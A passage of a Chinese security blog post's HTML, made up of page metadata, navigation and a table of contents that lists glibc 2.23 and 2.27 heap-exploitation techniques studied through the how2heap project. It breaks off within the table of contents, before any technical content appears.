<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="how2heap学习篇。https://github.com/shellphish/how2heap 之前写过glibc2.23的源码分析，这里可以照着源码来看。 2.27的话就是加了一个tcache这个东西，之后的版本也差不了太多，但是2.34把malloc_hook这些给删除了 这里争对的是linux，win下的堆分配不一样。  how2heapfirst_fit.c 这就是告诉了我们g">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap系列学习(持续更新)">
<meta property="og:url" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="how2heap学习篇。https://github.com/shellphish/how2heap 之前写过glibc2.23的源码分析，这里可以照着源码来看。 2.27的话就是加了一个tcache这个东西，之后的版本也差不了太多，但是2.34把malloc_hook这些给删除了 这里争对的是linux，win下的堆分配不一样。  how2heapfirst_fit.c 这就是告诉了我们g">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/1.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/2.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/3.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/5.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/6.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/7.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/8.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/9.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/10.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/11.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/12.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/13.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/14.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/15.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/16.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/17.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/18.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/19.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/20.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/21.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/22.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/23.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/24.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/25.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/28.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/27.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/29.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/30.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/31.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/32.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/33.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/34.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/35.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/37.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/38.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/39.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/40.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/41.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/42.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/43.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/44.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/45.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/46.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/47.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/48.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/49.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/50.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/51.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/52.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/53.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/54.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/55.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/56.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/1.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/2.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/3.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/4.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/5.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/6.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/7.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/8.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/9.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/10.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/11.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/12.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/13.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/14.png">
<meta property="og:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/15.png">
<meta property="article:published_time" content="2022-03-12T07:06:25.000Z">
<meta property="article:modified_time" content="2022-05-19T00:54:12.000Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>how2heap系列学习(持续更新)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;text=how2heap系列学习(持续更新)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;is_video=false&amp;description=how2heap系列学习(持续更新)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=how2heap系列学习(持续更新)&amp;body=Check out this article: http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=how2heap系列学习(持续更新)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;name=how2heap系列学习(持续更新)&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;t=how2heap系列学习(持续更新)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap"><span class="toc-number">1.</span> <span class="toc-text">how2heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#first-fit-c"><span class="toc-number">1.1.</span> <span class="toc-text">first_fit.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc-2-23"><span class="toc-number">1.2.</span> <span class="toc-text">glibc_2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-double-free"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastbin_dup(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">1.2.2.</span> <span class="toc-text">fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-double-free-malloc-consolidate"><span class="toc-number">1.2.3.</span> <span class="toc-text">fastbin_dup_consolidate(double free-malloc_consolidate)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-spirit-%E4%BC%AA%E9%80%A0chunk"><span class="toc-number">1.2.4.</span> <span class="toc-text">house_of_spirit(伪造chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-off-by-null"><span class="toc-number">1.2.5.</span> <span class="toc-text">poison_null_byte(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-small-bin"><span class="toc-number">1.2.6.</span> <span class="toc-text">house_of_lore(small bin)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks"><span class="toc-number">1.2.7.</span> <span class="toc-text">overlapping_chunks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-2"><span class="toc-number">1.2.8.</span> <span class="toc-text">overlapping_chunks_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-top-chunk"><span class="toc-number">1.2.9.</span> <span class="toc-text">house_of_force(top_chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.2.10.</span> <span class="toc-text">unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-einherjar-off-by-null"><span class="toc-number">1.2.11.</span> <span class="toc-text">house_of_einherjar(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-orange-top-chunk-FSOP"><span class="toc-number">1.2.12.</span> <span class="toc-text">house_of_orange(top chunk + FSOP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-roman-%E6%97%A0show%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.13.</span> <span class="toc-text">house_of_roman(无show函数)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack%EF%BC%88%E8%B7%9F-unsorted-bin-attack-%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%8A%9F%E8%83%BD%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%89"><span class="toc-number">1.2.14.</span> <span class="toc-text">large_bin_attack（跟 unsorted bin attack 实现的功能差不多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-unsorted-bin-attack-large-bin-attack"><span class="toc-number">1.2.15.</span> <span class="toc-text">house_of_storm(unsorted bin attack + large bin attack)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks%EF%BC%88mmap%EF%BC%89"><span class="toc-number">1.2.16.</span> <span class="toc-text">mmap_overlapping_chunks（mmap）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc-2-27"><span class="toc-number">1.3.</span> <span class="toc-text">glibc_2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-double-free-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">fastbin_dup(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-%E5%88%86%E9%85%8D%E5%88%B0%E6%A0%88%E4%B8%8A"><span class="toc-number">1.3.2.</span> <span class="toc-text">fastbin_dup_into_stack(分配到栈上)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache"><span class="toc-number">1.3.3.</span> <span class="toc-text">fastbin_reverse_into_tcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake-double-free"><span class="toc-number">1.3.4.</span> <span class="toc-text">house_of_botcake(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning-%E6%89%93fd"><span class="toc-number">1.3.5.</span> <span class="toc-text">tcache_poisoning(打fd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-house-of-spirit%EF%BC%88%E5%9C%A8%E6%A0%88%E4%B8%8A%E4%BC%AA%E9%80%A0chunk%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">tcache_house_of_spirit（在栈上伪造chunk）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-stashing-unlink-attack-2-27-amp-2-29-smallbin-amp-calloc"><span class="toc-number">1.3.7.</span> <span class="toc-text">tcache_stashing_unlink_attack(2.27&amp;2.29 smallbin &amp; calloc)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-double-free"><span class="toc-number">1.3.8.</span> <span class="toc-text">fastbin_dup_consolidate(double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-off-by-one"><span class="toc-number">1.3.9.</span> <span class="toc-text">overlapping_chunks(off-by-one)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-off-by-null-1"><span class="toc-number">1.3.10.</span> <span class="toc-text">poison_null_byte(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks-mmap"><span class="toc-number">1.3.11.</span> <span class="toc-text">mmap_overlapping_chunks(mmap)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake-double-free-1"><span class="toc-number">1.3.12.</span> <span class="toc-text">house_of_botcake(double free)</span></a></li><li class="toc-item 